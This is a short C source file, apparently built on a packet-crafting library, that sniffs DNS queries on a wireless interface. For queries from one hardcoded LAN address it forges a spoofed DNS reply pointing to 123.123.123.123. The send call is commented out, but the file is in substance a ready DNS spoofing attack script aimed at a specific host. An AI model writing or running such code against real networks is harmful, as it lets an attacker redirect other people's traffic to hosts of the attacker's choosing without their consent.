#include <pgen.h>
#include <sniff.h>
#include <stdio.h>

const char* dev = "wlan0";
const char* target = "192.168.179.2";
const bool spoof = true;


void func(const u_char* packet, int len){
	pgen_dns pack;
	ipaddr tmp;
	
	pack.CAST(packet, len);

	tmp = pack.IP.src;
	pack.IP.src = pack.IP.dst;
	pack.IP.dst = tmp;

	pack.DNS.flags.qr = 1;
	pack.DNS.answer.addr = "123.123.123.123";
	
	printf("-->");
	pack.DSUMMARY();
	//pack.SEND(dev);
	
}



bool callback(const u_char* packet, int len){
	pgen_unknown buf1(packet, len);
	pgen_udp buf2;
	pgen_dns pack;

	if(!buf1.isUDP()) 	return true;
	buf2.CAST(packet, len);
	if(buf2.UDP.dst != 53)	return true;
	pack.CAST(packet, len);
	
	if(spoof){
		if(pack.IP.src == target)
			func(packet, len);
		else
			pack.DSUMMARY();
	}else{
		pack.DSUMMARY();	
	}
	return true;	
}



int main(int argc, char** argv){
	sniff(dev, callback);
}
